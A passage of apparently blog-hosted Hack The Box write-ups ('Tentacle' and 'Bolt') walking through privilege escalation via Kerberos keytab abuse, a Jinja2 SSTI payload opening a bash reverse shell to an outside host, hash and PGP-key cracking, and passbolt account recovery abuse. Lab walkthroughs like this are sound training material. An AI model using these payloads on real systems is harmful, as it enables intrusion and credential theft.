tmp]$ cat /usr/local/bin/log_backup.sh #!/bin/bash /usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/ cd /home/admin /usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log /usr/bin/rm -f access.log cache.log Let\u0026rsquo;s check permissions We can write to /var/log/squid/ [j.nakazawa@srv01 tmp]$ ls -ld /var/log/squid/ drwx-wx---. 2 admin squid 41 Dec 24 2020 /var/log/squid/ [j.nakazawa@srv01 tmp]$ groups j.nakazawa squid users We can create a .k5login file The .k5login file, which resides in a user's home directory, contains a list of the Kerberos principals. Anyone with valid tickets for a principal in the file is allowed host access with the UID of the user in whose home directory the file resides. One common use is to place a .k5login file in root's home directory, thereby granting system administrators remote root access to the host via Kerberos. The script copies all files from /var/log/squid/ to /home/admin and only deletes access.log, cache.log files We can ssh as admin [j.nakazawa@srv01 tmp]$ cd /var/log/squid/ [j.nakazawa@srv01 squid]$ echo \u0026#34;j.nakazawa@REALCORP.HTB\u0026#34; \u0026gt; .k5login And we can ssh as admin └─$ ssh admin@10.10.10.224 Activate the web console with: systemctl enable --now cockpit.socket Last login: Sat Sep 30 19:39:01 2023 [admin@srv01 ~]$ Root Enumerate [admin@srv01 home]$ find / -user admin -type f 2\u0026gt;/dev/null | grep -Ev \u0026#34;^/sys|^/run|^/proc\u0026#34; /home/admin/squid_logs.tar.gz.2023-09-30-194001 /var/spool/mail/admin [admin@srv01 home]$ ls -lha /var/spool/mail/admin -rw-rw----. 1 admin mail 0 Dec 9 2020 /var/spool/mail/admin [admin@srv01 home]$ find / -group admin -type f 2\u0026gt;/dev/null | grep -Ev \u0026#34;^/sys|^/run|^/proc\u0026#34; /home/admin/squid_logs.tar.gz.2023-09-30-194001 /home/admin/squid_logs.tar.gz.2023-09-30-194101 /usr/local/bin/log_backup.sh /etc/krb5.keytab The file /etc/krb5.keytab looks interesting https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5/doc/krb5-install/The-Keytab-File.html All Kerberos server machines need a keytab file, called /etc/krb5.keytab, to authenticate to the KDC. The keytab file is an encrypted, local, on-disk copy of the host's key. The keytab file, like the stash file (Create the Database) is a potential point-of-entry for a break-in, and if compromised, would allow unrestricted access to its host. The keytab file should be readable only by root, and should exist only on the machine's local disk. The file should not be part of any backup of the machine, unless access to the backup data is secured as tightly as access to the machine's root password itself. We can list the principals https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-user/What-is-a-Kerberos-Principal_003f.html The kadmin was added with changepw and admin privileges [admin@srv01 home]$ klist -k Keytab name: FILE:/etc/krb5.keytab KVNO Principal ---- -------------------------------------------------------------------------- 2 host/srv01.realcorp.htb@REALCORP.HTB 2 host/srv01.realcorp.htb@REALCORP.HTB 2 host/srv01.realcorp.htb@REALCORP.HTB 2 host/srv01.realcorp.htb@REALCORP.HTB 2 host/srv01.realcorp.htb@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB Since we can read the keytab file, we can use any of the principals listed in it kadmin [admin@srv01 home]$ kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB Couldn\u0026#39;t open log file /var/log/kadmind.log: Permission denied Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab. kadmin: list_principals K/M@REALCORP.HTB host/srv01.realcorp.htb@REALCORP.HTB j.nakazawa@REALCORP.HTB kadmin/admin@REALCORP.HTB kadmin/changepw@REALCORP.HTB kadmin/srv01.realcorp.htb@REALCORP.HTB kiprop/srv01.realcorp.htb@REALCORP.HTB krbtgt/REALCORP.HTB@REALCORP.HTB Since we are admin of the kerberos database, we can add root principal and switch to root To switch the user we use ksu One-liner: kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB -q \u0026quot;add_principal -pw pentest root\u0026quot; kadmin: add_principal root No policy specified for root@REALCORP.HTB; defaulting to no policy Enter password for principal \u0026#34;root@REALCORP.HTB\u0026#34;: Re-enter password for principal \u0026#34;root@REALCORP.HTB\u0026#34;: Principal \u0026#34;root@REALCORP.HTB\u0026#34; created. kadmin: list_principals K/M@REALCORP.HTB host/srv01.realcorp.htb@REALCORP.HTB j.nakazawa@REALCORP.HTB kadmin/admin@REALCORP.HTB kadmin/changepw@REALCORP.HTB kadmin/srv01.realcorp.htb@REALCORP.HTB kiprop/srv01.realcorp.htb@REALCORP.HTB krbtgt/REALCORP.HTB@REALCORP.HTB root@REALCORP.HTB kadmin: exit [admin@srv01 home]$ ksu WARNING: Your password may be exposed if you enter it here and are logged in remotely using an unsecure (non-encrypted) channel. Kerberos password for root@REALCORP.HTB: : Authenticated root@REALCORP.HTB Account root: authorization for root@REALCORP.HTB successful Changing uid to root (0) [root@srv01 home]# ","date":"September 27, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/tentacle/images/tentacle.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/tentacle/","summary":"Tentacle Enumeration nmap └─$ nmap -Pn -p- 10.10.10.224 -T4 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-26 20:09 BST Nmap scan report for 10.10.10.224 (10.10.10.224) Host is up (0.093s latency). Not shown: 65495 filtered tcp ports (no-response), 36 filtered tcp ports (host-unreach) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 88/tcp open kerberos-sec 3128/tcp open squid-http Nmap done: 1 IP address (1 host up) scanned in 39.58 seconds └─$ nmap -Pn -p22,53,88,3128 -sC -sV 10.","tags":["HTB","dig","dns","dnsenum","vhosts","kerbrute","kerberos","ntpdate","squid","as-rep-roast","john","proxychains","nmap-over-proxy","wpad","opensmtpd","exploitdb","cve-2020-7247","msmtprc","kinit","keytab","klist","getfacl","facl"],"title":"[HTB] Machine: Tentacle"},{"categories":null,"contents":"Bolt Enumeration nmap └─$ nmap -Pn -p- 10.10.11.114 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 11:56 BST Nmap scan report for 10.10.11.114 (10.10.11.114) Host is up (0.17s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 723.12 seconds └─$ nmap -Pn -p22,80,443 -sC -sV 10.10.11.114 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 12:13 BST Nmap scan report for 10.10.11.114 (10.10.11.114) Host is up (0.17s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA) | 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA) |_ 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Starter Website - About |_http-server-header: nginx/1.18.0 (Ubuntu) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_ssl-date: TLS randomness does not represent time |_http-server-header: nginx/1.18.0 (Ubuntu) | http-title: 400 The plain HTTP request was sent to HTTPS port |_Requested resource was /auth/login?redirect=%2F | ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU | Not valid before: 2021-02-24T19:11:23 |_Not valid after: 2022-02-24T19:11:23 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.26 seconds Web server vhosts From the request above we saw passbolt.bolt.htb Let\u0026rsquo;s check others └─$ wfuzz -u http://bolt.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \u0026#39;Host: FUZZ.bolt.htb\u0026#39; --hh 30341 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://bolt.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000038: 302 3 L 24 W 219 Ch \u0026#34;demo\u0026#34; 000000002: 200 98 L 322 W 4943 Ch \u0026#34;mail\u0026#34; Total time: 604.1514 Processed Requests: 19966 Filtered Requests: 19964 Requests/sec.: 33.04800 Visiting port 443 redirect to passbolt.bolt.htb We can use ffuf to filter out redirects to passbolt └─$ ffuf -u https://10.10.11.114 -H \u0026#34;Host: FUZZ.bolt.htb\u0026#34; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fr passbolt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : https://10.10.11.114 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.bolt.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Regexp: passbolt ________________________________________________ :: Progress: [19966/19966] :: Job [1/1] :: 24 req/sec :: Duration: [0:13:04] :: Errors: 0 :: passbolt.bolt.htb Port 443 mail.bolt.htb demo.bolt.htb bolt.htb Download the tar from http://bolt.htb/download gobuster └─$ gobuster dir -u http://bolt.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://bolt.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/09/23 21:25:00 Starting gobuster in directory enumeration mode =============================================================== /contact (Status: 200) [Size: 26293] /login (Status: 200) [Size: 9287] /download (Status: 200) [Size: 18570] /index (Status: 308) [Size: 239] [--\u0026gt; http://bolt.htb/] /register (Status: 200) [Size: 11038] /services (Status: 200) [Size: 22443] /profile (Status: 500) [Size: 290] /pricing (Status: 200) [Size: 31731] /logout (Status: 302) [Size: 209] [--\u0026gt; http://bolt.htb/] /sign-in (Status: 200) [Size: 9287] /sign-up (Status: 200) [Size: 11038] └─$ gobuster dir -u http://demo.bolt.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://demo.bolt.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/09/23 21:31:21 Starting gobuster in directory enumeration mode =============================================================== /login (Status: 200) [Size: 9710] /register (Status: 200) [Size: 11066] /logout (Status: 302) [Size: 219] [--\u0026gt; http://demo.bolt.htb/login] Foothold Let\u0026rsquo;s analyze image.tar It\u0026rsquo;s a docker image https://www.mikulskibartosz.name/what-is-inside-a-docker-image https://theartofmachinery.com/2021/03/18/reverse_engineering_a_docker_image.html https://blog.oddbit.com/post/2015-02-13-unpacking-docker-images/ Each directory has layer.tar └─$ tree -L 2 . ├── 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950 │ ├── json │ ├── layer.tar │ └── VERSION ├── 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c │ ├── json │ ├── layer.tar │ └── VERSION ├── 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa │ ├── json │ ├── layer.tar │ └── VERSION ├── 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab │ ├── json │ ├── layer.tar │ └── VERSION ├── 3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162 │ ├── json │ ├── layer.tar │ └── VERSION ├── 3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b │ ├── json │ ├── layer.tar │ └── VERSION ├── 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad │ ├── json │ ├── layer.tar │ └── VERSION ├── 745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf │ ├── json │ ├── layer.tar │ └── VERSION ├── 859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json ├── 9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77 │ ├── json │ ├── layer.tar │ └── VERSION ├── a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2 │ ├── json │ ├── layer.tar │ └── VERSION ├── d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26 │ ├── json │ ├── layer.tar │ └── VERSION ├── ferox-http_bolt_htb-1695500633.state ├── manifest.json └── repositories We can use dive to analyze the image We have a db.sqlite3 which is removed in latest layers Let\u0026rsquo;s grab the layer id and check the content of the layer.tar a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2 ┌──(kali㉿kali)-[~/bolt/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2] └─$ tar tf layer.tar db.sqlite3 root/ root/.ash_history tmp/ Let\u0026rsquo;s check the content └─$ sqlite3 db.sqlite3 SQLite version 3.42.0 2023-05-16 12:36:15 Enter \u0026#34;.help\u0026#34; for usage hints. sqlite\u0026gt; .table User sqlite\u0026gt; .schema User CREATE TABLE IF NOT EXISTS \u0026#34;User\u0026#34; ( id INTEGER NOT NULL, username VARCHAR, email VARCHAR, password BLOB, email_confirmed BOOLEAN, profile_update VARCHAR(80), PRIMARY KEY (id), UNIQUE (username), UNIQUE (email) ); sqlite\u0026gt; select * from User; 1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.|| sqlite\u0026gt; Let\u0026rsquo;s try to crack └─$ hashcat -m 500 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 3.1+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU ... $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt Session..........: hashcat Status...........: Cracked Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)) Hash.Target......: $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q. Time.Started.....: Mon Sep 25 17:25:28 2023 (12 secs) Time.Estimated...: Mon Sep 25 17:25:40 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 13944 H/s (8.85ms) @ Accel:64 Loops:1000 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 172800/14344385 (1.20%) Rejected.........: 0/172800 (0.00%) Restore.Point....: 172672/14344385 (1.20%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000 Candidate.Engine.: Device Generator Candidates.#1....: derek25 -\u0026gt; danniela Hardware.Mon.#1..: Util: 98% Started: Mon Sep 25 17:25:27 2023 Stopped: Mon Sep 25 17:25:42 2023 The creds only work for http://bolt.htb/login But nothing interesting We also have demo.bolt.htb Let\u0026rsquo;s check the source code Layer 3 according to dive ┌──(kali㉿kali)-[~/bolt/image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app] └─$ tree -L 2 . ├── base │ ├── forms.py │ ├── __init__.py │ ├── models.py │ ├── __pycache__ │ ├── routes.py │ ├── static │ ├── templates │ └── util.py ├── home │ ├── forms.py │ ├── __init__.py │ ├── __pycache__ │ ├── routes.py │ └── templates ├── __init__.py └── __pycache__ └── __init__.cpython-39.pyc 9 directories, 10 files If we check the routes.py in base, we have a code for registration: XNSS-HSJW-3NGU-8XTJ @blueprint.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): login_form = LoginForm(request.form) create_account_form = CreateAccountForm(request.form) if \u0026#39;register\u0026#39; in request.form: username = request.form[\u0026#39;username\u0026#39;] email = request.form[\u0026#39;email\u0026#39; ] code = request.form[\u0026#39;invite_code\u0026#39;] if code != \u0026#39;XNSS-HSJW-3NGU-8XTJ\u0026#39;: return render_template(\u0026#39;code-500.html\u0026#39;) data = User.query.filter_by(email=email).first() if data is None and code == \u0026#39;XNSS-HSJW-3NGU-8XTJ\u0026#39;: # Check usename exists user = User.query.filter_by(username=username).first() if user: return render_template( \u0026#39;accounts/register.html\u0026#39;, msg=\u0026#39;Username already registered\u0026#39;, success=False, form=create_account_form) # Check email exists user = User.query.filter_by(email=email).first() if user: return render_template( \u0026#39;accounts/register.html\u0026#39;, msg=\u0026#39;Email already registered\u0026#39;, success=False, form=create_account_form) # else we can create the user user = User(**request.form) db.session.add(user) db.session.commit() return render_template( \u0026#39;accounts/register.html\u0026#39;, msg=\u0026#39;User created please \u0026lt;a href=\u0026#34;/login\u0026#34;\u0026gt;login\u0026lt;/a\u0026gt;\u0026#39;, success=True, form=create_account_form) else: return render_template( \u0026#39;accounts/register.html\u0026#39;, form=create_account_form) Let\u0026rsquo;s register in demo.bolt.htb using the code The page has nothing interesting So we return back to the code We have a home/routes.py https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti @blueprint.route(\u0026#39;/confirm/changes/\u0026lt;token\u0026gt;\u0026#39;) def confirm_changes(token): \u0026#34;\u0026#34;\u0026#34;Confirmation Token\u0026#34;\u0026#34;\u0026#34; try: email = ts.loads(token, salt=\u0026#34;changes-confirm-key\u0026#34;, max_age=86400) except: abort(404) user = User.query.filter_by(username=email).first_or_404() name = user.profile_update template = open(\u0026#39;templates/emails/update-name.html\u0026#39;, \u0026#39;r\u0026#39;).read() msg = Message( recipients=[f\u0026#39;{user.email}\u0026#39;], sender = \u0026#39;support@example.com\u0026#39;, reply_to = \u0026#39;support@example.com\u0026#39;, subject = \u0026#34;Your profile changes have been confirmed.\u0026#34; ) msg.html = render_template_string(template % name) mail.send(msg) return render_template(\u0026#39;index.html\u0026#39;) So we have a possible SSTI It can be trigered via changing profile settings To be specific Name parameter It looks like it works https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python The payload: {{ namespace.__init__.__globals__.os.popen('id').read() }} Let\u0026rsquo;s get reverse shell {{ namespace.__init__.__globals__.os.popen('bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.9/6666 0\u0026gt;\u0026amp;1\u0026quot;').read() }} User Enumerate www-data@bolt:~$ cat /var/www/dev/config.py cat dev/config.py \u0026#34;\u0026#34;\u0026#34;Flask Configuration\u0026#34;\u0026#34;\u0026#34; #SQLALCHEMY_DATABASE_URI = \u0026#39;sqlite:///database.db\u0026#39; SQLALCHEMY_DATABASE_URI = \u0026#39;mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail\u0026#39; SQLALCHEMY_TRACK_MODIFICATIONS = True SECRET_KEY = \u0026#39;kreepandcybergeek\u0026#39; MAIL_SERVER = \u0026#39;localhost\u0026#39; MAIL_PORT = 25 MAIL_USE_TLS = False MAIL_USE_SSL = False #MAIL_DEBUG = app.debug MAIL_USERNAME = None MAIL_PASSWORD = None DEFAULT_MAIL_SENDER = \u0026#39;support@bolt.htb\u0026#39; www-data@bolt:~$ cat /var/www/demo/config.py cat demo/config.py \u0026#34;\u0026#34;\u0026#34;Flask Configuration\u0026#34;\u0026#34;\u0026#34; #SQLALCHEMY_DATABASE_URI = \u0026#39;sqlite:///database.db\u0026#39; SQLALCHEMY_DATABASE_URI = \u0026#39;mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail\u0026#39; SQLALCHEMY_TRACK_MODIFICATIONS = True SECRET_KEY = \u0026#39;kreepandcybergeek\u0026#39; MAIL_SERVER = \u0026#39;localhost\u0026#39; MAIL_PORT = 25 MAIL_USE_TLS = False MAIL_USE_SSL = False #MAIL_DEBUG = app.debug MAIL_USERNAME = None MAIL_PASSWORD = None DEFAULT_MAIL_SENDER = \u0026#39;support@bolt.htb\u0026#39; www-data@bolt:~$ cat /var/www/roundcube/config/config.inc.php cat roundcube/config/config.inc.php \u0026lt;?php /* Local configuration for Roundcube Webmail */ // ---------------------------------- // SQL DATABASE // ---------------------------------- // Database connection string (DSN) for read+write operations // Format (compatible with PEAR MDB2): db_provider://user:password@host/database // Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle // For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php // Note: for SQLite use absolute path (Linux): \u0026#39;sqlite:////full/path/to/sqlite.db?mode=0646\u0026#39; // or (Windows): \u0026#39;sqlite:///C:/full/path/to/sqlite.db\u0026#39; // Note: Various drivers support various additional arguments for connection, // for Mysql: key, cipher, cert, capath, ca, verify_server_cert, // for Postgres: application_name, sslmode, sslcert, sslkey, sslrootcert, sslcrl, sslcompression, service. // e.g. \u0026#39;mysql://roundcube:@localhost/roundcubemail?verify_server_cert=false\u0026#39; $config[\u0026#39;db_dsnw\u0026#39;] = \u0026#39;mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube\u0026#39;; // $config[\u0026#39;enable_installer\u0026#39;] = true; // Log sent messages to \u0026lt;log_dir\u0026gt;/sendmail.log or to syslog $config[\u0026#39;smtp_log\u0026#39;] = false; None of these passwords work But we also have passbolt /etc/passbolt/passbolt.php ... // Database configuration. \u0026#39;Datasources\u0026#39; =\u0026gt; [ \u0026#39;default\u0026#39; =\u0026gt; [ \u0026#39;host\u0026#39; =\u0026gt; \u0026#39;localhost\u0026#39;, \u0026#39;port\u0026#39; =\u0026gt; \u0026#39;3306\u0026#39;, \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;passbolt\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;rT2;jW7\u0026lt;eY8!dX8}pQ8%\u0026#39;, \u0026#39;database\u0026#39; =\u0026gt; \u0026#39;passboltdb\u0026#39;, ], ], ... And it works for eddie Let\u0026rsquo;s connect via ssh Root We have a message from the clark Looks like we should look for a key We have .config folder in eddie\u0026rsquo;s home Inside we have google-chrome Related to the message we saw from clark clark mentioned plugins/extensions We have 3 eddie@bolt:~$ ls -lha /home/eddie/.config/google-chrome/Default/Extensions/ total 20K drwx------ 5 eddie eddie 4.0K Feb 25 2021 . drwx------ 23 eddie eddie 4.0K Aug 4 2021 .. drwx------ 3 eddie eddie 4.0K Feb 25 2021 didegimhafipceonhjepacocaffmoppf drwx------ 3 eddie eddie 4.0K Feb 25 2021 nmmhkkegccagdldgiimedpiccmgmieda drwx------ 3 eddie eddie 4.0K Feb 25 2021 pkedcjkdefgpdelpbcmbmeomcjbeemfm Let\u0026rsquo;s find the passbolt extension eddie@bolt:~/.config/google-chrome/Default/Extensions$ grep -ir passbolt | cut -d\u0026#39;/\u0026#39; -f1 | uniq didegimhafipceonhjepacocaffmoppf Now let\u0026rsquo;s look for key eddie@bolt:~/.config/google-chrome/Default$ grep -nr \u0026#34;didegimhafipceonhjepacocaffmoppf\u0026#34; . | cut -d\u0026#39;/\u0026#39; -f2 | uniq Favicons matches Preferences:1:{\u0026#34;account_id_migration_state\u0026#34;:2,\u0026#34;account_tracker_service_last_update\u0026#34;:\u0026#34;13258762424334951\u0026#34;,\u0026#34;alternate_error_pages\u0026#34;:{\u0026#34;backup\u0026#34;:true},\u0026#34;announcement_notification_service_first_run_time\u0026#34;:\u0026#34;13258762424167263\u0026#34;,\u0026#34;autocomplete\u0026#34;:{\u0026#34;retention_policy_last_version\u0026#34;:88},\u0026#34;autofill\u0026#34;:{\u0026#34;orphan_rows_removed\u0026#34;:true},\u0026#34;browser\u0026#34;:{\u0026#34;has_seen_welcome_page\u0026#34;:true,\u0026#34;window_placement\u0026#34;:{\u0026#34;bottom\u0026#34;:1045,\u0026#34;left\u0026#34;:429,\u0026#34;maximized\u0026#34;:true,\u0026#34;right\u0026#34;:1239,\u0026#34;top\u0026#34;:39,\u0026#34;work_area_bottom\u0026#34;:1200,\u0026#34;work_area_left\u0026#34;:72,\u0026#34;work_area_right\u0026#34;:1920,\u0026#34;work_area_top\u0026#34;:27}},\u0026#34;countryid_at_install\u0026#34;:21843,\u0026#34;custom_links\u0026#34;:{\u0026#34;initialized\u0026#34;:true,\u0026#34;list\u0026#34;:[{\u0026#34;isMostVisited\u0026#34;:true,\u0026#34;title\u0026#34;:\u0026#34;Passbolt\u0026#34;,\u0026#34;url\u0026#34;:\u0026#34;https: History Provider Cache matches DownloadMetadata matches History matches shared_proto_db Local Extension Settings Sessions eddie@bolt:~/.config/google-chrome/Default$ grep -n \u0026#34;PRIVATE\u0026#34; \u0026#34;Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log\u0026#34; Binary file Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches We found a key inside using strings \u0026quot;Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log | less Let\u0026rsquo;s crack it └─$ gpg2john priv.key \u0026gt; priv.key.hash File priv.key └─$ john --wordlist=/usr/share/wordlists/rockyou.txt priv.key.hash Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 16777216 for all loaded hashes Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:04:00 0.08% (ETA: 2023-09-30 02:25) 0g/s 60.41p/s 60.41c/s 60.41C/s teamoj..taztaz 0g 0:00:04:03 0.08% (ETA: 2023-09-30 02:22) 0g/s 60.42p/s 60.42c/s 60.42C/s langlang..lamont1 merrychristmas (Eddie Johnson) 1g 0:00:11:49 DONE (2023-09-26 19:07) 0.001409g/s 60.39p/s 60.39c/s 60.39C/s merrychristmas..menudo Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. We need this key to able to recover the password https://community.passbolt.com/t/recover-account-on-a-network-without-email/1394 We have to visit https://passbolt.bolt.htb/ and enter eddie@bolt.htb Then we connect to db to retrieve user_id and token eddie@bolt:~/.config/google-chrome/Default$ mysql -u passbolt -p\u0026#39;rT2;jW7\u0026lt;eY8!dX8}pQ8%\u0026#39; passboltdb mysql: [Warning] Using a password on the command line interface can be insecure. Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 379 Server version: 8.0.26-0ubuntu0.20.04.2 (Ubuntu) Copyright (c) 2000, 2021, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. mysql\u0026gt; select id from users where username = \u0026#39;eddie@bolt.htb\u0026#39;; +--------------------------------------+ | id | +--------------------------------------+ | 4e184ee6-e436-47fb-91c9-dccb57f250bc | +--------------------------------------+ 1 row in set (0.00 sec) mysql\u0026gt; select token from authentication_tokens where user_id = \u0026#39;4e184ee6-e436-47fb-91c9-dccb57f250bc\u0026#39; and type = \u0026#39;recover\u0026#39;; Empty set (0.00 sec) mysql\u0026gt; select token from authentication_tokens where user_id = \u0026#39;4e184ee6-e436-47fb-91c9-dccb57f250bc\u0026#39; and type = \u0026#39;recover\u0026#39;; +--------------------------------------+ | token | +--------------------------------------+ | 2b4571b7-6cb7-4572-b1d2-ea7bdc9e8388 | +--------------------------------------+ 1 row in set (0.00 sec) mysql\u0026gt; So the link we have to visit is https://passbolt.bolt.htb/setup/recover/4e184ee6-e436-47fb-91c9-dccb57f250bc/2b4571b7-6cb7-4572-b1d2-ea7bdc9e8388 When we visit the link we have to install the extension After installation, we have window with Private key After entering the private key, we are asked a passphrase, that we cracked before Enter passphrase and click Next Then 